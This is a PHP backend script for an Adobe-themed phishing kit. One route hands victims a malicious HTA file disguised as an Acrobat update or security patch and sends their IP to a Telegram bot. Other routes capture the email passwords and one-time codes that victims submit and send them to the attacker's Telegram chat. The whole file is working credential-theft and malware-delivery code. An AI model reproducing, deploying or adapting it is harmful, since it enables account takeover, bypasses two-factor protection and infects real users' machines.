<?php
// — TELEGRAM CONFIGURATION —
define('TG_ENABLED',  true);
define('TG_BOT_TOKEN', 'YOUR_TELEGRAM_BOT_TOKEN_HERE'); 
define('TG_CHAT_ID',   'YOUR_TELEGRAM_CHAT_ID_HERE');   

// — EMAIL CONFIGURATION —
define('MAIL_ENABLED', false); // Set true if you want email logs too
define('MAIL_TO',      'your-email@example.com');

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// ─── HELPERS ────────────────────────────────────────────────────────────────
function getIP() {
    foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return $_SERVER[$k];
    }
    return 'UNKNOWN';
}
function now() { return date('Y-m-d H:i:s'); }

// ─── TELEGRAM NOTIFICATION ──────────────────────────────────────────────────
function sendTelegram(string $text) {
    if (!defined('TG_BOT_TOKEN') || empty(TG_BOT_TOKEN)) return;
    $url = "https://api.telegram.org/bot" . TG_BOT_TOKEN . "/sendMessage";
    $payload = http_build_query(['chat_id' => TG_CHAT_ID, 'text' => $text, 'parse_mode' => 'HTML']);
    $ctx = stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => $payload, 'timeout' => 10]]);
    @file_get_contents($url, false, $ctx);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ROUTE: UNIQUE PAYLOAD DOWNLOAD (GET REQUEST)
// ═══════════════════════════════════════════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['route']) && $_GET['route'] === 'get-unique-payload') {
    
    // 1. Generate Unique Filename
    $themes = ['Adobe_Acrobat_Update', 'PDF_Security_Patch', 'Document_Viewer_Pro', 'Acrobat_DC_Installer'];
    $theme = $themes[array_rand($themes)];
    $uniqueId = str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $filename = $theme . '_' . $uniqueId . '.hta';
    
    // 2. Define Master File Path (CRITICAL FOR RAILWAY)
    // Use __DIR__ to ensure we look in the EXACT same folder as post.php
    $masterPath = __DIR__ . '/payload/master.hta';
    
    // Debug logging (check Railway logs if download fails)
    error_log("[PAYLOAD] Looking for: " . $masterPath);
    error_log("[PAYLOAD] Exists: " . (file_exists($masterPath) ? 'YES' : 'NO'));
    
    // 3. Send Telegram Notification BEFORE Downloading
    $ip = getIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $tgMsg = "📥 <b>NEW PAYLOAD DOWNLOADED</b>\n\n" .
             "<b>Filename:</b> <code>{$filename}</code>\n" .
             "<b>IP Address:</b> <code>{$ip}</code>\n" .
             "<b>User Agent:</b> {$ua}\n" .
             "<b>Time:</b> " . now();
             
    sendTelegram($tgMsg);
    
    // 4. Serve the Master File as the Unique Name
    if (file_exists($masterPath) && is_readable($masterPath)) {
        // Clear any previous output buffering to prevent corruption
        while (ob_get_level()) ob_end_clean();
        
        header('Content-Type: application/hta');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($masterPath));
        header('Cache-Control: no-cache, no-store, must-revalidate');
        
        readfile($masterPath);
        exit;
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Master payload not found at: ' . $masterPath]);
        exit;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// EXISTING LOGIN/OTP LOGIC (KEPT INTACT BELOW)
// ═══════════════════════════════════════════════════════════════════════════════
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

$ip        = getIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// BRANCH 1: LOGIN
if (isset($_POST['email_address']) && isset($_POST['password'])) {
    $email    = trim($_POST['email_address'] ?? '');
    $password = $_POST['password'] ?? '';
    $formId   = trim($_POST['id'] ?? '');
    $providers = ['1'=>'Outlook','2'=>'Office365','3'=>'Yahoo Mail','5'=>'Other Mail','6'=>'Gmail'];
    $provider  = $providers[$formId] ?? 'Unknown';

    if (empty($email) || empty($password)) {
        echo json_encode(['status' => 'error', 'message' => 'Email and password are required']);
        exit;
    }

    $record = ['type'=>'LOGIN','timestamp'=>now(),'ip'=>$ip,'provider'=>$provider,'email'=>$email,'password'=>$password,'user_agent'=>$userAgent];
    
    $tgMsg = "🔐 <b>ADOBE LOGIN CAPTURED</b>\n" . 
             "<b>Email:</b> {$email}\n<b>Pass:</b> {$password}\n<b>IP:</b> {$ip}";
    sendTelegram($tgMsg);

    echo json_encode(['status' => 'success', 'message' => 'Credentials received', 'next' => 'otp']);
    exit;
}

// BRANCH 2: OTP
if (isset($_POST['txtotp'])) {
    $otp = trim($_POST['txtotp'] ?? '');
    if (empty($otp)) {
        echo json_encode(['status' => 'error', 'message' => 'OTP is required']);
        exit;
    }

    $tgMsg = "🔑 <b>ADOBE OTP CAPTURED</b>\n" . 
             "<b>Code:</b> {$otp}\n<b>IP:</b> {$ip}";
    sendTelegram($tgMsg);

    echo json_encode(['status' => 'success', 'message' => 'OTP received', 'next' => 'done']);
    exit;
}

http_response_code(400);
echo json_encode(['status' => 'error', 'message' => 'Unknown form submission']);
?>
